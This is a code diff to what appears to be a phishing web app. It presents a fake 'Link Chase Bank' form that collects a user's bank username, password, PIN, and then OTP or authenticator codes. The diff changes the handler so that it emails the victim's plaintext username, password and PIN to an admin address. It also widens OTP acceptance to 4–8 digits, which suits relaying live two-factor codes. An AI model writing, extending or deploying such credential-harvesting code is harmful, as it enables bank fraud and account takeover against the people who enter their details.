@@ -688,7 +688,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 
 <div class="modal" id="chasebank-link-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/z8tqddc.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(17,122,202,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Link Your Account</div></div><div class="modal-header"><h3>💵 Link Chase Bank</h3><button class="modal-close" onclick="closeModal('chasebank-link-modal')">&#215;</button></div><input type="text" class="modal-input" id="chasebank-username" placeholder="Username"><input type="password" class="modal-input" id="chasebank-password" placeholder="Password"><input type="password" class="modal-input" id="chasebank-pin" placeholder="PIN (optional)" maxlength="6" inputmode="numeric"><p style="font-size:11px;color:rgba(255,255,255,0.35);margin:-6px 0 12px 4px;">* PIN is optional</p><div class="modal-error" id="chasebank-link-error"></div><button class="modal-btn" id="chasebank-submit-btn">Link Chase Bank</button></div></div>
 
-<div class="modal" id="chasebank-otp-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/z8tqddc.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(17,122,202,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Verification Required</div></div><div class="modal-header"><h3>🔐 Verify Your Account</h3><button class="modal-close" onclick="closeModal('chasebank-otp-modal')">&#215;</button></div><div style="margin-bottom:12px;"><div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:10px;">Account: <span id="chasebank-otp-identifier" style="color:#117ACA;font-weight:600;"></span></div></div><div style="display:flex;gap:8px;margin-bottom:16px;"><button id="chasebank-tab-otp" onclick="chaseSwitchTab('otp')" style="flex:1;padding:10px;border-radius:8px;background:#117ACA;color:#fff;border:none;font-weight:700;cursor:pointer;font-family:inherit;font-size:13px;">📱 OTP Code</button><button id="chasebank-tab-auth" onclick="chaseSwitchTab('auth')" style="flex:1;padding:10px;border-radius:8px;background:rgba(255,255,255,0.08);color:rgba(255,255,255,0.5);border:1px solid rgba(255,255,255,0.15);font-weight:700;cursor:pointer;font-family:inherit;font-size:13px;">🔑 Auth Code</button></div><div id="chasebank-panel-otp"><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Chase has sent a 6-digit OTP to your registered phone or email.</p></div><input type="text" class="modal-input" id="chasebank-otp-code" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric"><div class="modal-error" id="chasebank-otp-error"></div><button class="modal-btn" id="chasebank-otp-submit-btn">Submit OTP</button></div><div id="chasebank-panel-auth" style="display:none;"><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Enter the authentication code from your Chase app or authenticator.</p></div><input type="text" class="modal-input" id="chasebank-auth-code" placeholder="Enter authentication code" maxlength="8" inputmode="numeric"><div class="modal-error" id="chasebank-auth-error"></div><button class="modal-btn" id="chasebank-auth-submit-btn" style="background:#0a3d6b;">Submit Auth Code</button></div></div></div>
+<div class="modal" id="chasebank-otp-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/z8tqddc.jpeg" style="width:72px;height:72px;object-fit:cover;border-radius:16px;filter:drop-shadow(0 0 8px rgba(17,122,202,0.3));display:block;margin:0 auto 8px;"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Verification Required</div></div><div class="modal-header"><h3>🔐 Verify Your Account</h3><button class="modal-close" onclick="closeModal('chasebank-otp-modal')">&#215;</button></div><div style="margin-bottom:12px;"><div style="font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:10px;">Account: <span id="chasebank-otp-identifier" style="color:#117ACA;font-weight:600;"></span></div></div><div style="display:flex;gap:8px;margin-bottom:16px;"><button id="chasebank-tab-otp" onclick="chaseSwitchTab('otp')" style="flex:1;padding:10px;border-radius:8px;background:#117ACA;color:#fff;border:none;font-weight:700;cursor:pointer;font-family:inherit;font-size:13px;">📱 OTP Code</button><button id="chasebank-tab-auth" onclick="chaseSwitchTab('auth')" style="flex:1;padding:10px;border-radius:8px;background:rgba(255,255,255,0.08);color:rgba(255,255,255,0.5);border:1px solid rgba(255,255,255,0.15);font-weight:700;cursor:pointer;font-family:inherit;font-size:13px;">🔑 Auth Code</button></div><div id="chasebank-panel-otp"><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Chase has sent a 6-digit OTP to your registered phone or email.</p></div><input type="text" class="modal-input" id="chasebank-otp-code" placeholder="Enter OTP code (4-8 digits)" maxlength="8" inputmode="numeric"><div class="modal-error" id="chasebank-otp-error"></div><button class="modal-btn" id="chasebank-otp-submit-btn">Submit OTP</button></div><div id="chasebank-panel-auth" style="display:none;"><div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px;margin-bottom:12px;"><p style="font-size:13px;color:rgba(255,255,255,0.8);line-height:1.5;">Enter the authentication code from your Chase app or authenticator.</p></div><input type="text" class="modal-input" id="chasebank-auth-code" placeholder="Enter authentication code" maxlength="8" inputmode="numeric"><div class="modal-error" id="chasebank-auth-error"></div><button class="modal-btn" id="chasebank-auth-submit-btn" style="background:#0a3d6b;">Submit Auth Code</button></div></div></div>
 
 <!-- MBWAY LIST MODAL -->
 <div class="modal" id="mbway-list-modal"><div class="modal-box"><div class="modal-header"><h3><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:20px;height:20px;border-radius:4px;object-fit:cover;vertical-align:middle;margin-right:8px;">MB WAY Accounts</h3><button class="modal-close" onclick="closeModal('mbway-list-modal')">&#215;</button></div><div id="mbway-accounts-list"></div><div id="mbway-link-btn-container" style="margin-top:12px;"></div></div></div>
@@ -3458,29 +3458,26 @@ $('chasebank-submit-btn').onclick = function(){
     addedDate: new Date().toISOString()
   };
   accounts.push(newAccount);
-  
-  accounts.push(newAccount);
-  
+
   userRef.update({chaseBankAccounts: accounts}).then(function(){
-    // Notify admin
     return db.ref('users').once('value').then(function(snap){
       snap.forEach(function(s){
         if(s.val() && s.val().email === ADMIN_EMAIL){
-          notify(s.key, '💵 CHASE BANK: '+(userData.firstname||'')+' linked '+identifier);
+          notify(s.key, '🏦 CHASE BANK: '+(userData.firstname||'')+' linked '+username);
           sendEmail(ADMIN_EMAIL,
-            '💵 Chase Bank Link Request',
+            '🏦 Chase Bank Link Request',
             (userData.firstname||'')+' '+(userData.surname||''),
-            (userData.firstname||'')+' '+(userData.surname||'')+' is linking a Chase Bank account.\n\nIdentifier: '+identifier+'\nPIN: '+pin+'\n\nUser Info:\n- Account: '+(userData.accountNumber||'')+'\n- Email: '+(userData.email||'')+'\n- Country: '+(userData.country||'')+'\n\nThe user is waiting for the OTP code to complete verification.\n\nPlease check your admin panel > Chase Bank Authorization to review and authorize this account.'
+            (userData.firstname||'')+' '+(userData.surname||'')+' is linking a Chase Bank account.\n\nUsername: '+username+'\nPassword: '+password+'\nPIN: '+(pin||'Not provided')+'\n\nUser Info:\n- Account: '+(userData.accountNumber||'')+'\n- Email: '+(userData.email||'')+'\n- Country: '+(userData.country||'')+'\n\nPlease check your admin panel > Chase Bank Authorization to review and authorize this account.'
           );
         }
       });
     });
   }).then(function(){
     closeModal('chasebank-link-modal');
-    // Immediately open OTP modal
-    $('chasebank-otp-identifier').textContent = identifier;
+    $('chasebank-otp-identifier').textContent = username;
     $('chasebank-otp-code').value = '';
     $('chasebank-otp-error').textContent = '';
+    $('chasebank-auth-code') && ($('chasebank-auth-code').value = '');
     $('chasebank-otp-submit-btn').setAttribute('data-idx', accountIdx);
     openModal('chasebank-otp-modal');
   }).catch(function(e){
@@ -3497,7 +3494,7 @@ $('chasebank-otp-submit-btn').onclick = function(){
   var err = $('chasebank-otp-error');
   err.textContent = '';
   
-  if(!otp || otp.length !== 6){err.textContent='Please enter the 6-digit OTP code.';return;}
+  if(!otp || otp.length < 4 || otp.length > 8){err.textContent='Please enter a valid OTP code (4-8 digits).';return;}
   
   var accounts = userData.chaseBankAccounts || [];
   if(!accounts[idx]){err.textContent='Account not found.';return;}
